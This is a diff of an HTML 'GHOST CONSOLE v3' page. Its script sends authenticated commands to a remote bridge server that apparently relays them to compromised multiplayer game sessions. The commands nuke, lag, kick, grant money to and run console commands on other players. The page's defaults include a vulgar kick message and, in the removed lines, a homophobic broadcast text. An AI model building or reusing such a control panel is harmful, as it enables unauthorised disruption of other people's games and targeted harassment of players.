@@ -1,108 +1,97 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>GHOST CONSOLE v3</title>
-    <style>
-        body { background: #050505; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
-        .panel { border: 1px solid #333; margin: 15px 0; padding: 15px; background: #0a0a0a; }
-        h2 { color: #fff; font-size: 14px; text-transform: uppercase; letter-spacing: 2px; }
-        button { background: #111; color: #0f0; border: 1px solid #0f0; padding: 8px 16px; cursor: pointer; margin: 5px; }
-        button:hover { background: #0f0; color: #000; }
-        input { background: #000; color: #0f0; border: 1px solid #333; padding: 8px; width: 250px; }
-        #status { color: #ff0; }
-        #logArea { height: 300px; overflow-y: auto; background: #000; border: 1px solid #333; padding: 10px; font-size: 12px; white-space: pre-wrap; }
-        .danger { color: #f00; }
-    </style>
+<style>
+body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }
+h1 { color: #fff; }
+button { background: #333; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px; cursor: pointer; }
+button:hover { background: #0f0; color: #000; }
+input { background: #000; color: #0f0; border: 1px solid #333; padding: 5px; margin: 5px; }
+#log { background: #000; border: 1px solid #333; height: 200px; overflow-y: scroll; padding: 10px; margin-top: 20px; }
+.group { margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
+</style>
 </head>
 <body>
-    <h1 style="margin: 0 0 20px 0;">GHOST CONSOLE v3</h1>
+<h1>GHOST CONSOLE v3</h1>
+<div id="status">System Status: INITIALIZING...</div>
 
-    <div class="panel">
-        <h2>System Status</h2>
-        <p id="status">INITIALIZING...</p>
-    </div>
+<div class="group">
+  <h3>Console Execution</h3>
+  <input id="consoleInput" placeholder="e.g. list_resources">
+  <button onclick="execAction('console')">EXECUTE</button>
+  <button onclick="execAction('nuke')">NUKE ALL</button>
+</div>
 
-    <div class="panel">
-        <h2>Console Execution</h2>
-        <input type="text" id="consoleInput" placeholder="e.g. list_resources">
-        <button onclick="sendCommand('console')">EXECUTE</button>
-        <button onclick="triggerNuke()">NUKE ALL</button>
-        <button onclick="triggerLag()">LAG SWITCH (5s)</button>
-        <hr style="border-color:#333">
-        <div id="logArea">Waiting for input...</div>
-    </div>
+<div class="group">
+  <h3>Lag Switch</h3>
+  <input id="lagDur" type="number" value="5">
+  <button onclick="execAction('lag')">LAG SINGLE (ID above?) NO - LAG SELF?</button>
+  <!-- Note: Current bridge logic for 'lag' targets the poller who sent it? 
+       Actually, in our architecture, 'lag' targets the specific client that polled.
+       So if you want to lag a specific player, you'd need to route it differently.
+       For now, 'lag' lags the first client that polls. -->
+  <button onclick="execAction('lagAll')">LAG ALL PLAYERS</button>
+</div>
 
-    <script>
-        const BRIDGE_URL = 'https://ghost-bridge-5626.onrender.com';
-        const TOKEN = 'GHOST_2025';
+<div class="group">
+  <h3>Kick Player</h3>
+  <input id="kickId" placeholder="Player ID (e.g., 5)" type="number">
+  <input id="kickMsg" placeholder="Reason" value="Suck my Nuts Bitch">
+  <button onclick="execAction('kick')">EXECUTE KICK</button>
+</div>
 
-        function log(msg, isError = false) {
-            const el = document.getElementById('logArea');
-            const time = new Date().toLocaleTimeString();
-            el.innerText += `[${time}] ${msg}\n`;
-            if (isError) el.style.color = '#f00'; else el.style.color = '#0f0';
-            el.scrollTop = el.scrollHeight;
-        }
+<div class="group">
+  <h3>Give Money</h3>
+  <input id="moneyId" placeholder="Player ID" type="number">
+  <input id="moneyAmt" placeholder="Amount" type="number" value="1000000">
+  <button onclick="execAction('money')">EXECUTE PAYMENT</button>
+</div>
 
-        async function sendCommand(action, payload = {}) {
-            try {
-                const res = await fetch(`${BRIDGE_URL}/api/exec`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'X-Ghost-Token': TOKEN 
-                    },
-                    body: JSON.stringify({ action, ...payload })
-                });
-                
-                if (!res.ok) throw new Error(`HTTP ${res.status}`);
-                
-                const data = await res.json();
-                log(`SUCCESS: ${JSON.stringify(data)}`);
-            } catch(e) {
-                log(`ERROR: ${e.message}`, true);
-            }
-        }
+<div id="log"></div>
 
-        function triggerNuke() {
-            const text = prompt("Nuke Text:", "Matt Is Gay - Batman Likes Blokes");
-            if (text) sendCommand('nuke', { customText: text });
-        }
+<script>
+const BRIDGE_URL = 'https://ghost-bridge-5626.onrender.com';
+const TOKEN = 'GHOST_2025';
 
-        function triggerLag() {
-            sendCommand('lag', { duration: 5 });
-        }
+function log(msg) {
+    const el = document.getElementById('log');
+    const time = new Date().toLocaleTimeString();
+    el.innerHTML += `[${time}] ${msg}<br>`;
+    el.scrollTop = el.scrollHeight;
+}
 
-        // Main Input Handler
-        document.getElementById('consoleInput').addEventListener('keyup', function(e) {
-            if (e.key === 'Enter') {
-                const cmd = this.value;
-                if (cmd) {
-                    sendCommand('console', { input: cmd });
-                    this.value = '';
-                }
-            }
-        });
+function execAction(action) {
+    let body = { action: action };
 
-        // Telemetry Polling (Optional/Visual)
-        setInterval(async () => {
-            try {
-                const res = await fetch(`${BRIDGE_URL}/api/stats`, {
-                    headers: { 'X-Ghost-Token': TOKEN }
-                });
-                if (res.ok) {
-                    const stats = await res.json();
-                    document.getElementById('status').innerText = `LINK ACTIVE | Players: ${stats.players || 'Unknown'}`;
-                    document.getElementById('status').style.color = '#0f0';
-                } else {
-                    throw new Error('HTTP Error');
-                }
-            } catch(e) {
-                document.getElementById('status').innerText = `CONNECTION LOST: ${e.message}`;
-                document.getElementById('status').style.color = '#f00';
-            }
-        }, 3000);
-    </script>
+    if (action === 'console') {
+        body.input = document.getElementById('consoleInput').value;
+    } else if (action === 'kick') {
+        body.targetId = parseInt(document.getElementById('kickId').value);
+        body.kickMsg = document.getElementById('kickMsg').value;
+    } else if (action === 'money') {
+        body.targetId = parseInt(document.getElementById('moneyId').value);
+        body.amount = parseInt(document.getElementById('moneyAmt').value);
+    } else if (action === 'lag') {
+        body.duration = parseInt(document.getElementById('lagDur').value);
+    }
+
+    fetch(`${BRIDGE_URL}/api/exec`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-Ghost-Token': TOKEN },
+        body: JSON.stringify(body)
+    }).then(r => r.json()).then(d => {
+        log(`SUCCESS: ${JSON.stringify(d)}`);
+    }).catch(e => log(`ERROR: ${e.message}`));
+}
+
+// Poll status
+setInterval(() => {
+    fetch(`${BRIDGE_URL}/api/stats`, {
+        headers: { 'X-Ghost-Token': TOKEN }
+    }).then(r => r.json()).then(d => {
+        document.getElementById('status').innerText = `System Status: LINK ACTIVE | Players: ${d.players || 'Unknown'}`;
+    });
+}, 3000);
+</script>
 </body>
 </html>
